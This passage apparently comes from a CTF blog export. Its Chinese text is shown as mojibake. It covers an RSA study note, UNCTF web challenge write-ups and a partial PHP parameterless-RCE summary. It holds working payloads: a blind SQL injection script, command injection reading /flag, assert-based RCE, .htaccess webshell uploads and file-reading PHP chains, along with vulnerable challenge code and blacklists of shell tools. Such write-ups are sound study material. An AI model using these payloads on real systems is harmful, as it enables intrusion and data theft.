â‰¡ -1 \\mod p(pâˆ’1)!â‰¡âˆ’1modp (pâˆ’1)!â‰¡pâˆ’1mod p(p-1)! â‰¡ p-1 \\mod p(pâˆ’1)!â‰¡pâˆ’1modp (pâˆ’2)!â‰¡1mod p(p-2)! â‰¡ 1 \\mod p(pâˆ’2)!â‰¡1modp æ±‚ q!mod pq! \\mod pq!modp çš„å€¼ å…¶ä¸­ q&lt;pq &lt; pq&lt;p, ä¸” pâˆ’qp - qpâˆ’q çš„å€¼ä¸å¤§ x=1x = 1x=1 iii ä» q+1q + 1q+1 åˆ° pâˆ’2p - 2pâˆ’2 è¿›è¡Œéå† x=xâˆ—(iâˆ’1mod p)x = x * (i^{-1} \\mod p)x=xâˆ—(iâˆ’1modp) åˆ™ q!=xq! = xq!=x openssl public.key 1openssl rsa -pubin -modulus -text -in public.key å¾—åˆ°eee, nnn flag.enc 12345678910111213from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPkey_info = RSA.construct((n, e, d, p, q))key = RSA.importKey(key_info.exportKey())key = PKCS1_OAEP.new(key)f = open(&#x27;flag.enc&#x27;, &#x27;r&#x27;).read()c = base64.b64decode(f)m = key.decrypt(c)##################import rsakey = rsa.PrivateKey(n,e,int(d),p,q)c = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()print(rsa.decrypt(c,key)) coppersmith 101 é¦–å…ˆæœ‰ä¸€ä¸ªé¦–ä¸€çš„å¤šé¡¹å¼ F(x)=xb+abâˆ’1âˆ—xbâˆ’1+...+a1x+a0F(x) = x^b+a_{b-1}*x^{b-1}+...+a_{1}x+a_{0}F(x)=xb+abâˆ’1â€‹âˆ—xbâˆ’1+...+a1â€‹x+a0â€‹ æˆ‘ä»¬çŸ¥é“å­˜åœ¨ä¸€ä¸ªæ•´æ•°x0x_{0}x0â€‹ï¼Œä½¿å¾—F(x0)â‰¡0mod nF(x_{0}) â‰¡ 0 \\mod nF(x0â€‹)â‰¡0modn åˆ™å¯ä»¥å€ŸåŠ©coppersmithâ€™s methodï¼Œå°†è¯¥å¼è½¬æ¢åˆ°æ•´æ•°åŸŸä¸Š ä½¿å¾—G(x)=0G(x) = 0G(x)=0 Example n=11âˆ—19=209n = 11 * 19 = 209n=11âˆ—19=209 F(x)â‰¡23âˆ—x2+13âˆ—x+61â‰¡0mod nF(x) â‰¡ 23*x^2 + 13*x + 61 â‰¡ 0 \\mod nF(x)â‰¡23âˆ—x2+13âˆ—x+61â‰¡0modn è¿™é‡Œçš„é¦–é¡¹ä¸ä¸º1ï¼Œåˆ™å¯ä»¥ä¹˜ä¸Š23çš„é€†å…ƒ F(x)â‰¡(23âˆ—x2+13âˆ—x+61)âˆ—100â‰¡0mod nF(x) â‰¡ (23*x^2 + 13*x + 61)*100 â‰¡ 0 \\mod nF(x)â‰¡(23âˆ—x2+13âˆ—x+61)âˆ—100â‰¡0modn F(x)â‰¡x2+134âˆ—x+40â‰¡0mod nF(x) â‰¡ x^2+134*x+40 â‰¡ 0 \\mod nF(x)â‰¡x2+134âˆ—x+40â‰¡0modn G(x)=aâˆ—F(x)+nâˆ—KG(x) = a*F(x) + n*KG(x)=aâˆ—F(x)+nâˆ—K (Kä¸ºxçš„å¤šé¡¹å¼) è§£å¾—G(6)=0G(6) = 0G(6)=0 å³F(6)â‰¡0mod nF(6) â‰¡ 0 \\mod nF(6)â‰¡0modn å¯¹äºRSAçš„å­¦ä¹ å¤§æ¦‚è¦å‘Šä¸€æ®µè½äº†ï¼Œè¯¥å»èŠ±ç‚¹æ—¶é—´å­¦å­¦Webï¼Œæˆ–æ˜¯åšåšé¢˜ï¼Œæˆ–æ˜¯å†™å†™PHPã€‚ The End, The Start.","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Crypto","slug":"Crypto","permalink":"https://yoloyolo.top/tags/Crypto/"},{"name":"RSA","slug":"RSA","permalink":"https://yoloyolo.top/tags/RSA/"}]},{"title":"CTFé¢˜è§£&æ‚è®°","slug":"CTF-Sloves","date":"2021-01-14T12:42:49.000Z","updated":"2022-06-27T18:35:50.000Z","comments":true,"path":"2021/01/14/CTF-Sloves/","link":"","permalink":"https://yoloyolo.top/2021/01/14/CTF-Sloves/","excerpt":"ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› UNCTF","text":"ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› UNCTF ä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ› â€”â€” TryToLogin è®¿é—®WebæœåŠ¡æ˜¯ä¸€ä¸ªç™»å…¥æ¡† éšä¾¿æ³¨å…¥ä¸‹å‘ç°åŸºæœ¬æ²¡ç”¨ï¼Œè€Œä¸”orè¢«banäº† æºç æç¤ºfileå‚æ•°å¯ä»¥è¯»æ–‡ä»¶ï¼Œå°è¯•è¯» /var/www/html/index.php ï¼Œå¤±è´¥ è¯»å–apacheæœåŠ¡é…ç½®æ–‡ä»¶ file=/etc/apache2/sites-available/000-default.conf å¾—çŸ¥Webæ ¹ç›®å½•ä¸º /var/www/secret_dir_2333/html/ file=/var/www/secret_dir_2333/html/index.php è¯»å–æºä»£ç å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071//è¿™é‡Œæ•´åˆäº†ä¸¤ä¸ªphpæ–‡ä»¶ï¼Œè‡³äºç™»å…¥å›æ˜¾éƒ¨åˆ†åˆ™ä»ç®€å¤„ç†&lt;?phpclass user&#123; public $hostname = &#x27;127.0.0.1&#x27;; public $username = &#x27;root&#x27;; public $password = &#x27;root&#x27;; public $database = &#x27;ctf&#x27;; private $mysqli = null; public function __construct() &#123; $this-&gt;mysqli = mysqli_connect( $this-&gt;hostname, $this-&gt;username, $this-&gt;password ); mysqli_select_db($this-&gt;mysqli,$this-&gt;database); &#125; public function filter() &#123; $_POST[&#x27;username&#x27;] = addslashes($_POST[&#x27;username&#x27;]); $_POST[&#x27;password&#x27;] = addslashes($_POST[&#x27;password&#x27;]); $safe1 = preg_match(&#x27;/inn|or/is&#x27;, $_POST[&#x27;username&#x27;]); $safe2 = preg_match(&#x27;/inn|or/is&#x27;, $_POST[&#x27;password&#x27;]); if($safe1 === 0 and $safe2 === 0)&#123; return true; &#125;else&#123; die(&#x27;No hacker!&#x27;); &#125; &#125; public function login() &#123; $this-&gt;filter(); $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;select * from user where username=&#x27;%s&#x27; and password=&#x27;$password&#x27;&quot;; $sql = sprintf($sql,$username); $result = mysqli_query($this-&gt;mysqli,$sql); $result = mysqli_fetch_object($result); if($result-&gt;id)&#123; return 1; &#125;else&#123; return 0; &#125; &#125;session_start();if(isset($_GET[&#x27;file&#x27;]))&#123; if(preg_match(&#x27;/flag/is&#x27;, $_GET[&#x27;file&#x27;]) === 0) &#123; echo file_get_contents(&#x27;/&#x27;.$_GET[&#x27;file&#x27;]); &#125;&#125;if(isset($_POST[&#x27;password&#x27;]))&#123; $user = new user; $login = $user-&gt;login(); if($login) &#123; echo &quot;Success!&quot;; &#125; else &#123; echo &quot;Wrong!&quot;; &#125;&#125;?&gt; ä¸€å¼€å§‹é¢å¯¹addslashes()è¿˜ä¸çŸ¥é“æ€ä¹ˆBypass ç„¶åçœ‹åˆ° $sql = sprintf($sql,$username); ç™¾åº¦ä¹‹åæŸ¥åˆ°äº†ä¸€ç¯‡æ–‡ç«  http://bey0nd.xyz/2018/11/05/1/ %såªæ˜¯å­—ç¬¦ä¸²æ ¼å¼åŒ–usernameï¼Œæ¼æ´ç‚¹è‚¯å®šä¸åœ¨è¿™é‡Œ å°±åœ¨passwordå¤„å¼€å§‹é€ ä½œ 123è¾“å…¥ å¤„ç† æ ¼å¼åŒ–&#39; -&gt; \\&#39; -&gt; \\&#39;%&#39; -&gt; %\\&#39; -&gt; %&#39; é‚£ä¹ˆå°±è¦è®©passwordæŠ¢æ‰usernameçš„æ ¼å¼åŒ–ï¼Œå¯ä»¥ä½¿ç”¨å ä½ç¬¦ orè¢«è¿‡æ»¤åˆ™å¯ä»¥ä½¿ç”¨|| è€Œ$usernameå¯ä»¥æ”¾ç©ºï¼Œä»¥é¿å…æ ¼å¼åŒ–å­—ç¬¦ä¸²æ—¶å‡ºä¹±å­ payload: 1password&#x3D;%1$&#39;||1# å°±å¯ä»¥åŸºäºè¿™ä¸ªç™»å…¥æˆåŠŸæˆ–å¤±è´¥çš„å›æ˜¾æ¥è¿›è¡Œç›²æ³¨ 12345678910111213141516171819202122232425#ç¥–ä¼ å¼‚æˆ–æ³¨å…¥è„šæœ¬import requestsr = requests.session()dbname = &#x27;&#x27;for i in range(1,50): bot = 32 top = 128 mid = (bot + top) // 2 while(bot &lt; top): url = &#x27;http://eci-2zegdefmmywv8xtsuu90.cloudeci1.ichunqiu.com/index.php&#x27; #æŸ¥åº“ #data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select database()),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; #æŸ¥è¡¨ #data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; data=&#123;&#x27;usernaem&#x27;:&#x27;&#x27;, &#x27;password&#x27;:&#x27;%1$\\&#x27;||(ascii(substr((select * from fl4g),&#123;&#125;,1))&gt;&#123;&#125;)#&#x27;.format(i,mid)&#125; res=r.post(url=url, data=data) if &quot;Success&quot; in res.text: bot = mid + 1 else: top = mid mid = (bot + top) // 2 if(mid == 32 or mid == 127): break dbname = dbname + chr(mid) print(dbname) ç°åœ¨æ‰æƒ³èµ·æ¥substræ˜¯ä»1å¼€å§‹çš„ è¿™é‡Œæœ‰ä¸¤ä¸ªç‚¹å¯ä»¥æä¸€ä¸‹ Bypass information_schema å‰ä¸¤å‘¨åˆ·BUUOJåˆ·åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œèººåœ¨to_do_listé‡Œé¢å°±ä¸€ç›´æ²¡çœ‹ï¼Œç»“æœè¿™ä¸ªé¢˜å·®ç‚¹åœ¨è¿™ä¸€æ­¥å¡æ­» å› ä¸ºorè¢«è¿‡æ»¤äº†ï¼Œä¸èƒ½ä½¿ç”¨information_schemaåº“æ¥è¿›è¡ŒæŸ¥åº“æŸ¥è¡¨æŸ¥åˆ—çš„ç»„åˆæ‹³ è€Œmysql 5.7ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨sysåº“ä¸­çš„ä¸€äº›è¡¨æ¥æŸ¥è¯¢åº“åå’Œè¡¨å ä¸ªäººæ€»ç»“å¦‚ä¸‹ 1234567891011121314151617sys.schema_object_overview db åº“åsys.schema_table_statistics table_schema åº“å table_name è¡¨åsys.schema_table_statistics_with_buffer table_schema åº“å table_name è¡¨åsys.x$schema_index_statistics table_schema åº“å table_name è¡¨åsys.x$schema_table_statistics table_schema åº“å table_name è¡¨åsys.x$ps_schema_table_statistics_io table_schema åº“å table_name è¡¨å è¿™é‡Œåªå†™å‡ºäº†å‡ ä¸ªé€šç”¨çš„è¡¨ å¦å¤–ä¸€ç§æ–¹æ³•åˆ™æ˜¯innodbï¼Œä¸è¿‡ä¹Ÿè¢«banäº† è€Œä¸”è¿™ä¸ªè¦æ±‚çš„æœåŠ¡mysqlé»˜è®¤æ˜¯ä¸å¼€å¯çš„ï¼Œé—¨æ§›è¾ƒé«˜ è¿™é‡Œå€’ä¸ç”¨ç»§ç»­çŒœåˆ—å ç›´æ¥ select * from fl4g å°±èƒ½å‡ºflag substr ä¸ select ä¸ column å½“æ—¶éšä¾¿æ‰“äº†ä¸ª select * from fl4g å°±å‡ºflagäº†ï¼Œä¹Ÿæ²¡å¤šæƒ³ åé¢æƒ³åˆ°å¦‚æœæ˜¯è¿™ç§ç›²æ³¨çš„æƒ…å†µï¼Œèƒ½ä¸èƒ½æ— åˆ—åè¯»å–è´¦æˆ·è¡¨ ç»“è®ºæ˜¯ä¸è¡Œï¼Œsubstrå†…è¿›è¡Œselectæ“ä½œ è‹¥è¯¥è¡¨åªæœ‰ä¸€åˆ—ï¼Œåˆ™å¯ä»¥ä½¿ç”¨select *ï¼Œæ— éœ€çŸ¥é“åˆ—å flagè¡¨å°±æ˜¯è¿™æ · è‹¥è¯¥è¡¨æœ‰å¤šåˆ—ï¼Œåˆ™å¿…é¡»æŒ‡å®šä¸€ä¸ªåˆ—åï¼Œæˆ–è€…ä½¿ç”¨concat/group_concatè¿æ¥å¤šä¸ªåˆ—å ç›²æ³¨banäº†orè¿˜è¦æŸ¥åˆ—åçš„æƒ…å†µè¿˜çœŸæ²¡é‡åˆ°è¿‡ æœ‰é”™è¯¯å›æ˜¾çš„æƒ…å†µä¸‹å¯ä»¥è¿›è¡Œåˆ—åçš„è·å– 12345678MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b)c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id))c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id,username))c;ERROR 1060 (42S21): Duplicate column name &#39;email&#39;MariaDB [ctf]&gt; select * from flag union all select * from (select * from user as a join user b using(id,username,email))c;ERROR 1222 (21000): The used SELECT statements have a different number of columns UNCTF â€”â€” UNâ€™s_online_tools è¿›å…¥é¡µé¢æ˜¯ä¸€ä¸ªPing Tool ç»å…¸çš„å‘½ä»¤æ³¨å…¥ è¾“å…¥|lsï¼Œå¾—åˆ°å›æ˜¾ index.php style.css å°è¯•äº†ä¸€ä¸‹åˆ«çš„è¾“å…¥ä¹‹åå‘ç°å­˜åœ¨é»‘åå•ï¼Œå…ˆå°è¯•è¯»å–index.php 12base64 index.phpbase64&lt;index.php è¿™é‡Œä½¿ç”¨tabç¬¦æˆ–&lt;éƒ½èƒ½ç”¨äºä»£æ›¿ç©ºæ ¼ æˆ–è€…ä½¿ç”¨stringsæ¥è¯»å–ï¼Œä¸è¿‡çœ‹æºç å¯èƒ½æœ‰ç‚¹éº»çƒ¦ 12345678910111213141516&lt;?phpif (isset($_GET[&#x27;url&#x27;]))&#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/(;|&#x27;| |&gt;|]|&amp;| |\\\\$|\\\\|rev|more|tailf|head|nl|tail|tac|cat|rm|cp|mv|\\*|\\&#123;)/i&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;éæ³•å­—ç¬¦&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;&lt;strong&gt;&lt;center&gt;éæ³•å­—ç¬¦&lt;/center&gt;&lt;/strong&gt;&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo($a);&#125;else&#123; echo &quot;&lt;script&gt;alert(&#x27;æ¬¢è¿æ¥åˆ°UN`s online tools å¦‚æœå¸ˆå‚…è§‰å¾—é¢˜ç›®ä¸é€‚åˆæ‚¨ï¼Œå¯ä»¥å‡ºé—¨å·¦æ‹&#x27;)&lt;/script&gt;&quot;;&#125;?&gt; 1|ls &#x2F; å¯ä»¥çœ‹åˆ°flagåœ¨æ ¹ç›®å½•ä¸‹ ä½†æ˜¯ç¬¬äºŒå±‚æ­£åˆ™åˆ™å¯¹äº&quot;flag&quot;è¿‡æ»¤å¾—å¾ˆä¸¥ åªèƒ½ä½¿ç”¨base64è¿›è¡Œbypass 1|&#96;echo Y2F0IC9mbGFn|base64 -d&#96; base64è§£ç çš„ç»“æœä¸º&quot;cat /flag&quot; ç„¶åå†é€šè¿‡``æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œå³å¯è¯»å–flag UNCTF â€”â€” L0vephp æŸ¥çœ‹æºä»£ç ï¼Œçœ‹åˆ°ä¸¤æ®µæ³¨é‡Šå†…å®¹ 12flag.phpB4Z0-@:OCnDf, å®åœ¨çœ‹ä¸å‡ºæ¥æ˜¯ä»€ä¹ˆç¼–ç ï¼Œä¸¢è¿›basecrack base85çš„è§£ç ç»“æœä¸ºget action å°è¯•?action=/etc/passwd å¯ä»¥è¯»å–passwdæ–‡ä»¶ ä½¿ç”¨base64ç¼–ç è¯»å–flag.phpæ—¶å‘ç°è¢«ban ä½¿ç”¨rot13è¯»å–flag.php ?action=php://filter/string.toupper|string.rot13/resource=flag.php åœ¨æ³¨é‡Šä¸­çœ‹åˆ°flag.phpçš„å†…å®¹ rot13è§£ç ä¹‹åçš„å†…å®¹å¦‚ä¸‹ 1234&lt;?PHP$FLAG = &quot;UNCTF&#123;7HIS_IS_@_F4KE_F1A9&#125;&quot;;//HINT:316E4433782E706870?&gt; 316E4433782E706870 è¿›è¡ŒBase16è§£ç å¾—åˆ° 1nD3x.php è®¿é—®1nD3x.php å†…å®¹å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);show_source(__FILE__);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;@&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;,&#x27;\\&amp;&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\*&#x27;,&#x27;\\`&#x27;,&#x27;\\+&#x27;,&#x27;\\-&#x27;,&#x27;\\&#x27;&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\\\\\\\&#x27;,&#x27;\\/&#x27;); $__=array(&#x27;eval&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell_exec&#x27;,&#x27;assert&#x27;,&#x27;passthru&#x27;,&#x27;array_map&#x27;,&#x27;ob_start&#x27;,&#x27;create_function&#x27;,&#x27;call_user_func&#x27;,&#x27;call_user_func_array&#x27;,&#x27;array_filter&#x27;,&#x27;proc_open&#x27;);$blacklist1 = array_merge($_);$blacklist2 = array_merge($__);if (strlen($code)&gt;16)&#123; die(&#x27;Too long&#x27;);&#125;foreach ($blacklist1 as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/m&#x27;, $code)) &#123; die(&#x27;WTF???&#x27;); &#125; &#125; foreach ($blacklist2 as $blackitem) &#123; if (preg_match (&#x27;/&#x27; . $blackitem . &#x27;/im&#x27;, $code)) &#123; die(&#x27;Sry,try again&#x27;); &#125;&#125;@eval($code);?&gt; è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹ å¯ä»¥ä½¿ç”¨phpå˜é•¿å‚æ•° 1234?1[]=test&amp;1[]=phpinfo()&amp;2=assertecho var_dump(...$_GET);array(2) &#123; [0]=&gt; string(4) &quot;test&quot; [1]=&gt; string(9) &quot;phpinfo()&quot; &#125; string(6) &quot;assert&quot; ä½¿ç”¨usortè¿›è¡Œå‘½ä»¤æ‰§è¡Œ ï¼ˆassertæ”¯æŒå¤šä¸ªå‚æ•°çš„ä»£ç æ‰§è¡Œï¼‰ 12GET: 1[]&#x3D;test&amp;1[]&#x3D;system(&#39;cat &#x2F;flag_mdnrvvldb&#39;)&amp;2&#x3D;assertPOST: code&#x3D;usort(...$GET); UNCTF â€”â€” easy_upload å†…å®¹åŒ¹é… 1preg_match(&quot;/perl|pyth|ph|auto|curl|\\|base|&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet/i&quot;,$black) è¿™é‡Œçš„ â€œ||base|â€œåŒ¹é…â€|baseâ€ è¯¦è§ PHPæ­£åˆ™äºŒæ¬¡è½¬ä¹‰(DATA_EXPUNGED) æ–‡ä»¶ååŒ¹é… 1preg_match(&quot;/ph|ml|js|cg/i&quot;, $name) ä¸¤ç§æ€è·¯ WebShell 123#.htaccessSetHandler application&#x2F;x-httpd-p\\hp 12#a.jpg&lt;?&#x3D;@eval($_GET[&quot;cmd&quot;]); CGI 123#.htaccessOptions ExecCGIAddHandler cgi-script .xxx 123456#a.xxx#!&#x2F;bin&#x2F;bashecho &quot;Content-Type: text&#x2F;plain&quot;echo &quot;&quot;cat &#x2F;flagexit 0 ç›¸å…³é“¾æ¥ .htaccess Trickåˆ†äº«","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://yoloyolo.top/categories/WriteUp/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://yoloyolo.top/tags/Web/"},{"name":"SQL_Injection","slug":"SQL-Injection","permalink":"https://yoloyolo.top/tags/SQL-Injection/"},{"name":"RCE","slug":"RCE","permalink":"https://yoloyolo.top/tags/RCE/"},{"name":"File_Upload","slug":"File-Upload","permalink":"https://yoloyolo.top/tags/File-Upload/"},{"name":"PHP","slug":"PHP","permalink":"https://yoloyolo.top/tags/PHP/"}]},{"title":"PHPæ— å‚æ•°RCE","slug":"PHP-RCE-Without-Parameters","date":"2021-01-14T12:27:25.000Z","updated":"2022-06-10T17:25:08.000Z","comments":true,"path":"2021/01/14/PHP-RCE-Without-Parameters/","link":"","permalink":"https://yoloyolo.top/2021/01/14/PHP-RCE-Without-Parameters/","excerpt":"CTFä¸­PHPæ— å‚æ•°RCEå°ç»“","text":"CTFä¸­PHPæ— å‚æ•°RCEå°ç»“ æ ¸å¿ƒä»£ç å¦‚ä¸‹ 1234if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;]))&#123; eval($_GET[&#x27;code&#x27;]);&#125; ä¸€èˆ¬ä¼šåœ¨æ­¤åŸºç¡€ä¸Šè¿‡æ»¤ä¸€äº›å‡½æ•°ä»¥å¢åŠ éš¾åº¦ æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨äºåŒ¹é…æ ·å¼å¦‚ä¸‹çš„å­—ç¬¦ä¸² a(); a(bb()); a(bb(ccc())); a()bb(); a(bb())ccc(dddd()); â€¦ BTW: å¯èƒ½åœ¨æ­£åˆ™é€’å½’åŒ¹é…æ—¶ä¼šBanæ‰â€™_â€™ å¸¸ç”¨å‡½æ•° get_defined_functions() : æ˜¾ç¤ºæ‰€æœ‰å‡½æ•° localeconv() : è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºâ€™.â€™ scandir() : è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ pos() : è¾“å‡ºå½“å‰å†…éƒ¨æŒ‡é’ˆæ‰€æŒ‡å‘çš„å…ƒç´  current() : è¿”å›æ•°ç»„å½“å‰å•å…ƒï¼ŒåŒpos() end() : å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚ next() : å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º file() : è¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿”å›çš„æ•°ç»„ä¸­å…ƒç´ å¯¹åº”æ¯ä¸€è¡Œçš„å†…å®¹ readfile() : è¯»å–ä¸€ä¸ªæ–‡ä»¶ sqrt() : è¿”å›ä¸€ä¸ªæ•°å­—çš„å¹³æ–¹æ ¹ tan() : è¿”å›ä¸€ä¸ªæ•°å­—çš„æ­£åˆ‡å¼§åº¦å€¼ atan() : è¿”å›ä¸€ä¸ªæ•°å­—çš„åæ­£åˆ‡å¼§åº¦å€¼ cosh() : è¿”å›ä¸€ä¸ªæ•°å­—çš„åŒæ›²ä½™å¼¦ sinh() : è¿”å›ä¸€ä¸ªæ•°å­—çš„åŒæ›²æ­£å¼¦ ceil() : è¿”å›å‘ä¸Šå–æ•´ floor() : è¿”å›å‘ä¸‹å–æ•´ round() ï¼š è¿”å›å››èˆäº”å…¥å–æ•´ chr() : è¿”å›æŒ‡å®šASCIIå€¼çš„å­—ç¬¦ ord() : è¿”å›å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€ä¸ªå­—ç¬¦ ASCIIå€¼ chdir() : æ”¹å˜å½“å‰çš„ç›®å½• localtime(timestamp,is_assoc) : å–å¾—æœ¬åœ°æ—¶é—´ï¼Œæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºç§’ time() : å¯¹åº”localtime()çš„timestamp phpversion() : è¿”å›phpç‰ˆæœ¬å· crypt() : ä½¿ç”¨ç›å€¼ç”ŸæˆHash hebrevc() : åå‘æ˜¾ç¤ºå¸Œä¼¯æ¥å­—ç¬¦ strrev() : åè½¬å­—ç¬¦ä¸² file() : æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªæ•°ç»„ä¸­ array_reverse() : è¿”å›ç¿»è½¬é¡ºåºçš„æ•°ç»„ array_flip() : åè½¬/äº¤æ¢æ•°ç»„ä¸­çš„é”®åå’Œå¯¹åº”å…³è”çš„é”®å€¼ array_rand() : è¿”å›ä¸€ä¸ªåŒ…å«éšæœºé”®åçš„æ•°ç»„ ç”Ÿæˆ . çš„å››ä¸ªæ€è·¯ strrev(crypt()) ç”ŸæˆHashï¼Œå¹¶å°†æœ€åä¸€ä½çš„.é€†åºåˆ°ç¬¬ä¸€ä½ï¼Œå¯ä»¥ä½¿ç”¨serialize(array())æˆ–phpversion()ä½œä¸ºå†…åµŒå‡½æ•° localeconv() é€‰å–ç¬¬ä¸€ä¸ªå…ƒç´  æ•°å­¦å‡½æ•°å¥—å¨ƒFuzz localtime(time()) ç¬¬46ç§’ [GXYCTF2019]ç¦æ­¢å¥—å¨ƒ 12345678910111213141516171819202122232425&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; ä¸”å½“å‰ç›®å½•çš„æ–‡ä»¶å¦‚ä¸‹ array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125; ä¸èƒ½æ§åˆ¶æ•°ç»„æŒ‡é’ˆç›´æ¥æŒ‡å‘flag.phpï¼Œåªèƒ½è¿›è¡Œéšæœºè¯»å– Payload0 1var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))); åˆ†æ phpversion() #ç”¨äºè¾“å‡ºphpå½“å‰ç‰ˆæœ¬ä¿¡æ¯ crypt(phpversion()) #åŠ å¯†ä¿¡æ¯ï¼Œæœ€åä¸€ä½æœ‰å¯èƒ½ä¸º. strrev(crypt(phpversion())) #å­—ç¬¦ä¸²é€†åºï¼Œå°†.ç§»åŠ¨è‡³ç¬¬ä¸€ä½ ord(strrev(crypt(phpversion()))) #å–ç¬¬ä¸€ä½çš„ASCIIç å€¼ chr(ord(strrev(crypt(phpversion())))) #è½¬ä¸ºå­—ç¬¦ï¼Œé…åˆä¸Šä¸€æ­¥å¯ä»¥èŠ‚é€‰å‡ºç¬¬ä¸€ä½çš„. scandir(chr(ord(strrev(crypt(phpversion()))))) #æ‰«æå½“å‰ç›®å½• array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))) #å°†æ‰«æç»“æœæ•°ç»„äº¤æ¢é”®åä¸é”®å€¼ array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))) #éšæœºé€‰å–æ•°ç»„é”®åï¼Œå³éšæœºé€‰å–æ–‡ä»¶å readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion())))))))) #è¯»å–æ–‡ä»¶ var_dump(readfile(array_rand(array_flip(scandir(chr(ord(strrev(crypt(phpversion()))))))))) #è¾“å‡ºè¯»å–æ–‡ä»¶ç»“æœ Payload1 1var_dump(readfile(array_rand(array_flip(scandir(pos(localeconv())))))); åˆ†æ localeconv() #ç”Ÿæˆæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªå…ƒç´ ä¸º. pos(localeconv()) #å–ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå³. scandir(pos(localeconv())) #æ‰«æå½“å‰ç›®å½• array_flip(scandir(pos(localeconv()))) 